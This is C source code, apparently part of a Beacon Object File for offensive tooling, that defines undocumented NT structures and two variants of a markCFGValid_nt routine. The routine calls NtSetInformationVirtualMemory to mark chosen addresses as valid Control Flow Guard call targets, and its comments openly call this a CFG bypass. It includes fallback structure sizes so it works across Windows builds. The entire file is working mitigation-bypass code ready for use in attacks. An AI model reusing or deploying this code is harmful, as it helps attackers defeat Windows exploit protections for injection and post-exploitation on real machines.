
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

BOOL markCFGValid_nt(PVOID pvAddress);

#ifndef CFG_CALL_TARGET_VALID
#define CFG_CALL_TARGET_VALID (0x00000001)
typedef struct _CFG_CALL_TARGET_INFO {
  ULONG_PTR Offset;
  ULONG_PTR Flags;
} CFG_CALL_TARGET_INFO, *PCFG_CALL_TARGET_INFO;
#endif

typedef struct _VM_INFORMATION
{
	DWORD					dwNumberOfOffsets;
	PULONG					plOutput;
	PCFG_CALL_TARGET_INFO	ptOffsets;
	PVOID					pMustBeZero;
	PVOID					pMoarZero;

} VM_INFORMATION, * PVM_INFORMATION;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
	VmPrefetchInformation,
	VmPagePriorityInformation,
	VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_RANGE_ENTRY
{
	PVOID  VirtualAddress;
	SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, * PMEMORY_RANGE_ENTRY;


typedef enum _MEMORY_INFORMATION_CLASS {
	MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

NTSYSAPI NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE hProcess, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformatio, SIZE_T MemoryInformationLenght, PSIZE_T ReturnLenght);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory( HANDLE hProcess, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddress, PVOID VmInformatio, ULONG VmInformationLenght );

#define NtQueryVirtualMemory          NTDLL$NtQueryVirtualMemory
#define NtSetInformationVirtualMemory NTDLL$NtSetInformationVirtualMemory

/* Two versions of the markCFGValid_nt function are supplied.
 * Version 1: (default)
 *    Attempts to set the cfg bypass using defined size of VM_INFORMATION data structure.
 *    If that fails then it will use a smaller hard coded size of 24, which has been
 *    verified to work on older Windows versions when the first attempt fails.
 *
 * Version 2:
 *    This version will loop through a range of sizes (increment by 8) until it finds
 *    a size that works.  It also contains commented out debug code to send information
 *    to the OutputDebugStringA function.
 *    This version is intended to be a debugging aid to help resolve issues if
 *    version 1 fails.
 */

#if 1
BOOL markCFGValid_nt(PVOID pAddress)
{
    ULONG dwOutput = 0;
    NTSTATUS ntStatus = 0;
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VM_INFORMATION tVmInformation = { 0 };

    MEMORY_RANGE_ENTRY tVirtualAddresses = { 0 };
    CFG_CALL_TARGET_INFO OffsetInformation = { 0 };

    NTSTATUS status = NtQueryVirtualMemory(NtCurrentProcess(), pAddress, MemoryBasicInformation, &mbi, sizeof(mbi), 0);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE)	{
        return FALSE;
    }

    OffsetInformation.Offset = (ULONG_PTR)pAddress - (ULONG_PTR)mbi.BaseAddress;
    OffsetInformation.Flags = CFG_CALL_TARGET_VALID;

    tVirtualAddresses.NumberOfBytes = (SIZE_T)mbi.RegionSize;
    tVirtualAddresses.VirtualAddress = (PVOID)mbi.BaseAddress;

    tVmInformation.dwNumberOfOffsets = 0x1;
    tVmInformation.plOutput = &dwOutput;
    tVmInformation.ptOffsets = &OffsetInformation;
    tVmInformation.pMustBeZero = 0x0;
    tVmInformation.pMoarZero = 0x0;

    // Attempt to set the CFG bypass
    ntStatus = NtSetInformationVirtualMemory(NtCurrentProcess(), VmCfgCallTargetInformation, 1, &tVirtualAddresses, (PVOID)&tVmInformation, (ULONG)sizeof(tVmInformation));
    if (0xC00000F4 == ntStatus) {
        // The size parameter is not valid try 24 instead, which is a known size for older windows versions.
        ntStatus = NtSetInformationVirtualMemory(NtCurrentProcess(), VmCfgCallTargetInformation, 1, &tVirtualAddresses, (PVOID)&tVmInformation, 24);
    }

    if (!NT_SUCCESS(ntStatus)) {
        // STATUS_INVALID_PAGE_PROTECTION , CFG isn't enabled on the process
        if (0xC0000045 != ntStatus) {
            return FALSE;
        }
    }

    return TRUE;
}

#else
/* The code below implements a loop around the NtSetInformationVirtualMemory function to try
 * different sizes for the tVmInformation data structure as this can be different depending
 * on the Windows OS build.
 */
BOOL markCFGValid_nt(PVOID pAddress)
{
    ULONG dwOutput = 0;
    ULONG VmInformationSize = 0;
    NTSTATUS ntStatus = 0;
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VM_INFORMATION tVmInformation = { 0 };

    MEMORY_RANGE_ENTRY tVirtualAddresses = { 0 };
    CFG_CALL_TARGET_INFO OffsetInformation = { 0 };

    // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "markCFGValid_nt: %p", pAddress);
    // OutputDebugStringA(dbgbuffer);

    NTSTATUS status = NtQueryVirtualMemory(NtCurrentProcess(), pAddress, MemoryBasicInformation, &mbi, sizeof(mbi), 0);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE)	{
        return FALSE;
    }

    OffsetInformation.Offset = (ULONG_PTR)pAddress - (ULONG_PTR)mbi.BaseAddress;
    OffsetInformation.Flags = CFG_CALL_TARGET_VALID;

    tVirtualAddresses.NumberOfBytes = (SIZE_T)mbi.RegionSize;
    tVirtualAddresses.VirtualAddress = (PVOID)mbi.BaseAddress;

    tVmInformation.dwNumberOfOffsets = 0x1;
    tVmInformation.plOutput = &dwOutput;
    tVmInformation.ptOffsets = &OffsetInformation;
    tVmInformation.pMustBeZero = 0x0;
    tVmInformation.pMoarZero = 0x0;


    // Windows build 1709 uses a size of 24
    // Newer windows uses a size of 40 = sizeof(tVmInformation)
    // for (VmInformationSize = 24; VmInformationSize <= (ULONG)sizeof(tVmInformation); VmInformationSize+=8) {
    for (VmInformationSize = (ULONG)sizeof(tVmInformation); VmInformationSize >= 24; VmInformationSize-=8) {
        // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "Attempt to mark the OFFSET as valid: %lu, using VmInformationSize %lu", OffsetInformation.Offset, VmInformationSize);
        // OutputDebugStringA(dbgbuffer);

        // Found that different version of windows may have different sizes for the VmInformation data structure
        ntStatus = NtSetInformationVirtualMemory(NtCurrentProcess(), VmCfgCallTargetInformation, 1, &tVirtualAddresses, (PVOID)&tVmInformation, VmInformationSize);

        if (NT_SUCCESS(ntStatus)) {
            // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "Success: %x", ntStatus);
            // OutputDebugStringA(dbgbuffer);
            return TRUE;
        }

        // Determine the reason for the failure.
        // STATUS_INVALID_PAGE_PROTECTION, CFG isn't enabled on the process
        if (0xC0000045 == ntStatus) {
            // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "CFG is not enabled : %x", ntStatus);
            // OutputDebugStringA(dbgbuffer);
            return TRUE;
        }

        if (0xC00000F4 == ntStatus) {
            continue; // Size parameter is incorrect try next one.
        }

        // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "Failed to bypass CFG protections: %x", ntStatus);
        // OutputDebugStringA(dbgbuffer);
        return FALSE;
    }

    // sprintf_s(dbgbuffer, sizeof(dbgbuffer), "Failed to bypass CFG protections: Unable to find valid VmInformationSize");
    // OutputDebugStringA(dbgbuffer);
    return FALSE;
}
#endif
